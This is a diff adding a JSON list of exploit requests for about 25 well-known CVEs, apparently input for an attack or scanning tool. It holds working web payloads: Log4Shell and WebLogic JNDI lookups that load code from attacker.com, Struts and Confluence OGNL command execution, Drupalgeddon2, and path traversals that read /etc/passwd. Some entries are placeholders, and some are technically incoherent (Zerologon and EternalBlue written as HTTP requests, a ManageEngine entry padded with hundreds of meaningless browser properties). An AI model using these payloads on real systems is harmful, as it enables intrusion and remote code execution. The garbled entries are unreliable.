@@ -1,0 +1,554 @@
+[
+  {
+    "name": "CVE-2021-44228",
+    "description": "Log4Shell - RCE en Apache Log4j",
+    "method": "POST",
+    "endpoint": "/api/login",
+    "headers": {
+      "User-Agent": "${jndi:ldap://attacker.com/exploit}"
+    },
+    "parameters": {
+      "username": "admin",
+      "password": "test123"
+    }
+  },
+  {
+    "name": "CVE-2017-5638",
+    "description": "RCE en Apache Struts",
+    "method": "POST",
+    "endpoint": "/struts2-showcase/fileupload/doUpload.action",
+    "headers": {
+      "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryabc123",
+      "Content-Disposition": "form-data; name=\"upload\"; filename=\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\""
+    },
+    "parameters": {}
+  },
+  {
+    "name": "CVE-2019-19781",
+    "description": "Path Traversal en Citrix ADC",
+    "method": "GET",
+    "endpoint": "/vpn/../vpns/cfg/smb.conf",
+    "headers": {
+      "Host": "target.com"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "CVE-2021-34527",
+    "description": "PrintNightmare - RCE en Windows Print Spooler",
+    "method": "POST",
+    "endpoint": "/printers",
+    "headers": {
+      "Content-Type": "application/soap+xml"
+    },
+    "parameters": {
+      "data": "<soap:Envelope>...malicious print driver...</soap:Envelope>"
+    }
+  },
+  {
+    "name": "CVE-2018-7600",
+    "description": "Drupalgeddon2 - RCE en Drupal",
+    "method": "POST",
+    "endpoint": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "form_id": "user_register_form",
+      "_drupal_ajax": "1",
+      "mail[#post_render][]": "passthru",
+      "mail[#type]": "markup",
+      "mail[#markup]": "whoami"
+    }
+  },
+  {
+    "name": "CVE-2019-0604",
+    "description": "RCE en Microsoft SharePoint",
+    "method": "POST",
+    "endpoint": "/_layouts/15/Picker.aspx",
+    "headers": {
+      "Content-Type": "text/xml"
+    },
+    "parameters": {
+      "__VIEWSTATE": "...malicious serialized object..."
+    }
+  },
+  {
+    "name": "CVE-2020-1472",
+    "description": "Zerologon - Netlogon Elevation of Privilege",
+    "method": "NETLOGON",
+    "endpoint": "/netlogon",
+    "headers": {
+      "Authorization": "Negotiate"
+    },
+    "parameters": {
+      "client_challenge": "0000000000000000"
+    }
+  },
+  {
+    "name": "CVE-2021-26855",
+    "description": "ProxyLogon - SSRF en Exchange Server",
+    "method": "POST",
+    "endpoint": "/owa/auth/Current/themes/resources/error.aspx",
+    "headers": {
+      "Cookie": "X-BEResource=localhost~1942062522",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "__VIEWSTATE": "...malicious payload..."
+    }
+  },
+  {
+    "name": "CVE-2017-0144",
+    "description": "EternalBlue - SMB RCE",
+    "method": "SMB",
+    "endpoint": "/srv",
+    "headers": {
+      "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+    },
+    "parameters": {
+      "Trans2": "malicious SMB packet"
+    }
+  },
+  {
+    "name": "CVE-2019-11510",
+    "description": "Path Traversal en Pulse Connect Secure",
+    "method": "GET",
+    "endpoint": "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/",
+    "headers": {
+      "Host": "vpn.target.com"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "CVE-2020-1350",
+    "description": "SIGRed - RCE en Windows DNS Server",
+    "method": "DNS",
+    "endpoint": "/dns",
+    "headers": {
+      "Content-Type": "application/dns-message"
+    },
+    "parameters": {
+      "query": "malicious DNS payload"
+    }
+  },
+  {
+    "name": "CVE-2018-13379",
+    "description": "Path Traversal en Fortinet FortiOS",
+    "method": "GET",
+    "endpoint": "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
+    "headers": {
+      "Cookie": "APSCOOKIE_1234567890=1234567890"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "CVE-2021-21972",
+    "description": "RCE en vSphere Client",
+    "method": "POST",
+    "endpoint": "/ui/vropspluginui/rest/services/uploadova",
+    "headers": {
+      "Content-Type": "multipart/form-data"
+    },
+    "parameters": {
+      "file": "malicious OVA file"
+    }
+  },
+  {
+    "name": "CVE-2019-2725",
+    "description": "RCE en Oracle WebLogic",
+    "method": "POST",
+    "endpoint": "/_async/AsyncResponseService",
+    "headers": {
+      "Content-Type": "text/xml"
+    },
+    "parameters": {
+      "soap": "<soap:Envelope>...deserialization payload...</soap:Envelope>"
+    }
+  },
+  {
+    "name": "CVE-2021-26084",
+    "description": "OGNL Injection en Confluence",
+    "method": "POST",
+    "endpoint": "/pages/doenterpagevariables.action",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "queryString": "\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).eval(\\u0027var isWin=java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022);var cmd=new java.lang.String(\\u0022whoami\\u0022);var p=new java.lang.ProcessBuilder();if(isWin){p.command(\\u0022cmd.exe\\u0022,\\u0022/c\\u0022,cmd);}else{p.command(\\u0022bash\\u0022,\\u0022-c\\u0022,cmd);}p.redirectErrorStream(true);var process=p.start();var inputStream=process.getInputStream();var result=new java.util.Scanner(inputStream).useDelimiter(\\u0022\\\\A\\u0022);result.hasNext()?result.next():\\u0022\\u0022;\\u0027)}+\\u0027"
+    }
+  },
+  {
+    "name": "CVE-2018-4878",
+    "description": "Use-After-Free en Adobe Flash",
+    "method": "GET",
+    "endpoint": "/flash.swf",
+    "headers": {
+      "Content-Type": "application/x-shockwave-flash"
+    },
+    "parameters": {
+      "payload": "malicious SWF file"
+    }
+  },
+  {
+    "name": "CVE-2020-0688",
+    "description": "RCE en Microsoft Exchange",
+    "method": "POST",
+    "endpoint": "/owa/auth/errorFE.aspx",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "__VIEWSTATE": "malicious serialized viewstate"
+    }
+  },
+  {
+    "name": "CVE-2019-3396",
+    "description": "Path Traversal en Confluence",
+    "method": "POST",
+    "endpoint": "/rest/tinymce/1/macro/preview",
+    "headers": {
+      "Content-Type": "application/json",
+      "Referer": "https://confluence.target.com"
+    },
+    "parameters": {
+      "contentId": "123",
+      "macro": {
+        "name": "widget",
+        "body": "{\"url\":\"https://www.viddler.com/v/23464bd5\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"../web.xml\"}"
+      }
+    }
+  },
+  {
+    "name": "CVE-2021-40539",
+    "description": "RCE en Zoho ManageEngine",
+    "method": "POST",
+    "endpoint": "/ServletAPI/accounts/login",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "login": "admin",
+      "password": "password",
+      "domain": "localhost",
+      "AUTHRULE_NAME": "ADAuthenticator",
+      "csrfToken": "123456",
+      "j_username": "admin",
+      "j_password": "password",
+      "domainName": "localhost",
+      "mobile": "false",
+      "mode": "1",
+      "loginButton": "Login",
+      "userName": "admin",
+      "passwordField": "password",
+      "domainField": "localhost",
+      "remember": "false",
+      "timezoneOffset": "0",
+      "userStore": "AD",
+      "encoded": "true",
+      "authType": "Basic",
+      "loginId": "admin",
+      "reqId": "1",
+      "container": "default",
+      "goto": "ON",
+      "gotoOnFail": "ON",
+      "contextType": "user",
+      "challenge": "false",
+      "requestid": "1",
+      "isAjax": "true",
+      "loginFormID": "loginForm",
+      "loginURL": "/ServletAPI/accounts/login",
+      "productName": "ADSelfService Plus",
+      "version": "6100",
+      "build": "6100",
+      "edition": "Enterprise",
+      "lang": "en",
+      "country": "US",
+      "timezone": "UTC",
+      "sessionid": "1234567890",
+      "random": "123456",
+      "userAgent": "Mozilla/5.0",
+      "screenResolution": "1920x1080",
+      "colorDepth": "24",
+      "javaEnabled": "false",
+      "flashVersion": "0",
+      "silverlightVersion": "0",
+      "windows": "true",
+      "mac": "false",
+      "linux": "false",
+      "solaris": "false",
+      "sunos": "false",
+      "iphone": "false",
+      "ipad": "false",
+      "ipod": "false",
+      "android": "false",
+      "blackberry": "false",
+      "windowsPhone": "false",
+      "symbian": "false",
+      "webos": "false",
+      "chromeos": "false",
+      "bsd": "false",
+      "other": "false",
+      "touch": "false",
+      "mobileDevice": "false",
+      "tablet": "false",
+      "desktop": "true",
+      "tv": "false",
+      "gameConsole": "false",
+      "mediaPlayer": "false",
+      "ebookReader": "false",
+      "car": "false",
+      "watch": "false",
+      "glass": "false",
+      "camera": "false",
+      "portableMediaPlayer": "false",
+      "phablet": "false",
+      "smartDisplay": "false",
+      "peripheral": "false",
+      "wearable": "false",
+      "embedded": "false",
+      "robot": "false",
+      "unknown": "false",
+      "inputDevices": "keyboard,mouse,touchscreen",
+      "outputDevices": "screen,speaker",
+      "network": "ethernet,wifi",
+      "storage": "harddisk,ssd",
+      "memory": "8GB",
+      "cpu": "4 cores",
+      "gpu": "dedicated",
+      "battery": "none",
+      "power": "ac",
+      "orientation": "landscape",
+      "devicePixelRatio": "1",
+      "pixelDepth": "24",
+      "availableWidth": "1920",
+      "availableHeight": "1040",
+      "innerWidth": "1920",
+      "innerHeight": "1040",
+      "outerWidth": "1920",
+      "outerHeight": "1080",
+      "screenWidth": "1920",
+      "screenHeight": "1080",
+      "screenAvailWidth": "1920",
+      "screenAvailHeight": "1080",
+      "screenLeft": "0",
+      "screenTop": "0",
+      "pageXOffset": "0",
+      "pageYOffset": "0",
+      "scrollX": "0",
+      "scrollY": "0",
+      "length": "0",
+      "frameElement": "null",
+      "frames": "window",
+      "parent": "window",
+      "top": "window",
+      "document": "[object Document]",
+      "location": "[object Location]",
+      "history": "[object History]",
+      "navigator": "[object Navigator]",
+      "screen": "[object Screen]",
+      "performance": "[object Performance]",
+      "localStorage": "[object Storage]",
+      "sessionStorage": "[object Storage]",
+      "applicationCache": "[object ApplicationCache]",
+      "caches": "[object CacheStorage]",
+      "indexedDB": "[object IDBFactory]",
+      "webkitIndexedDB": "[object IDBFactory]",
+      "mozIndexedDB": "[object IDBFactory]",
+      "msIndexedDB": "[object IDBFactory]",
+      "openDatabase": "function",
+      "webkitRequestFileSystem": "function",
+      "webkitResolveLocalFileSystemURL": "function",
+      "alert": "function",
+      "blur": "function",
+      "confirm": "function",
+      "focus": "function",
+      "moveBy": "function",
+      "moveTo": "function",
+      "open": "function",
+      "print": "function",
+      "prompt": "function",
+      "resizeBy": "function",
+      "resizeTo": "function",
+      "scroll": "function",
+      "scrollBy": "function",
+      "scrollTo": "function",
+      "stop": "function",
+      "close": "function",
+      "closed": "false",
+      "defaultStatus": "",
+      "defaultstatus": "",
+      "devicePixelRatio": "1",
+      "dialogArguments": "undefined",
+      "dialogHeight": "",
+      "dialogLeft": "",
+      "dialogTop": "",
+      "dialogWidth": "",
+      "directories": "false",
+      "frameElement": "null",
+      "frames": "window",
+      "fullScreen": "false",
+      "innerHeight": "1040",
+      "innerWidth": "1920",
+      "length": "0",
+      "locationbar": "[object BarProp]",
+      "menubar": "[object BarProp]",
+      "name": "",
+      "onabort": "null",
+      "onafterprint": "null",
+      "onbeforeprint": "null",
+      "onbeforeunload": "null",
+      "onblur": "null",
+      "oncanplay": "null",
+      "oncanplaythrough": "null",
+      "onchange": "null",
+      "onclick": "null",
+      "oncontextmenu": "null",
+      "ondblclick": "null",
+      "ondrag": "null",
+      "ondragend": "null",
+      "ondragenter": "null",
+      "ondragleave": "null",
+      "ondragover": "null",
+      "ondragstart": "null",
+      "ondrop": "null",
+      "ondurationchange": "null",
+      "onemptied": "null",
+      "onended": "null",
+      "onerror": "null",
+      "onfocus": "null",
+      "onhashchange": "null",
+      "oninput": "null",
+      "oninvalid": "null",
+      "onkeydown": "null",
+      "onkeypress": "null",
+      "onkeyup": "null",
+      "onload": "null",
+      "onloadeddata": "null",
+      "onloadedmetadata": "null",
+      "onloadstart": "null",
+      "onmessage": "null",
+      "onmousedown": "null",
+      "onmousemove": "null",
+      "onmouseout": "null",
+      "onmouseover": "null",
+      "onmouseup": "null",
+      "onmousewheel": "null",
+      "onoffline": "null",
+      "ononline": "null",
+      "onpagehide": "null",
+      "onpageshow": "null",
+      "onpause": "null",
+      "onplay": "null",
+      "onplaying": "null",
+      "onpopstate": "null",
+      "onprogress": "null",
+      "onratechange": "null",
+      "onreset": "null",
+      "onresize": "null",
+      "onscroll": "null",
+      "onseeked": "null",
+      "onseeking": "null",
+      "onselect": "null",
+      "onstalled": "null",
+      "onstorage": "null",
+      "onsubmit": "null",
+      "onsuspend": "null",
+      "ontimeout": "null",
+      "onunload": "null",
+      "onvolumechange": "null",
+      "onwaiting": "null",
+      "opener": "null",
+      "outerHeight": "1080",
+      "outerWidth": "1920",
+      "pageXOffset": "0",
+      "pageYOffset": "0",
+      "parent": "window",
+      "personalbar": "[object BarProp]",
+      "screen": "[object Screen]",
+      "screenLeft": "0",
+      "screenTop": "0",
+      "screenX": "0",
+      "screenY": "0",
+      "scrollbars": "[object BarProp]",
+      "scrollX": "0",
+      "scrollY": "0",
+      "self": "window",
+      "status": "",
+      "statusbar": "[object BarProp]",
+      "toolbar": "[object BarProp]",
+      "top": "window",
+      "window": "window"
+    }
+  },
+  {
+    "name": "CVE-2021-34473",
+    "description": "ProxyShell - SSRF en Exchange",
+    "method": "POST",
+    "endpoint": "/autodiscover/autodiscover.json",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "Email": "autodiscover/autodiscover.json?a=foo@bar.com"
+    }
+  },
+  {
+    "name": "CVE-2018-11776",
+    "description": "RCE en Apache Struts",
+    "method": "GET",
+    "endpoint": "/struts2-showcase/",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "redirect:${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('whoami')}": ""
+    }
+  },
+  {
+    "name": "CVE-2020-14882",
+    "description": "RCE en Oracle WebLogic",
+    "method": "GET",
+    "endpoint": "/console/images/%252E%252E%252Fconsole.portal",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "_nfpb": "true",
+      "_pageLabel": "HomePage1",
+      "handle": "com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('whoami');\")"
+    }
+  },
+  {
+    "name": "CVE-2019-5418",
+    "description": "File Disclosure en Ruby on Rails",
+    "method": "GET",
+    "endpoint": "/api/users/1",
+    "headers": {
+      "Accept": "../../../../../../../../etc/passwd{{"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "CVE-2021-41773",
+    "description": "Path Traversal en Apache HTTP Server",
+    "method": "GET",
+    "endpoint": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "headers": {
+      "Host": "target.com"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "CVE-2020-2551",
+    "description": "RCE en Oracle WebLogic",
+    "method": "POST",
+    "endpoint": "/console/consolejndi.portal",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "jndi": "ldap://attacker.com/exploit"
+    }
+  }
+]
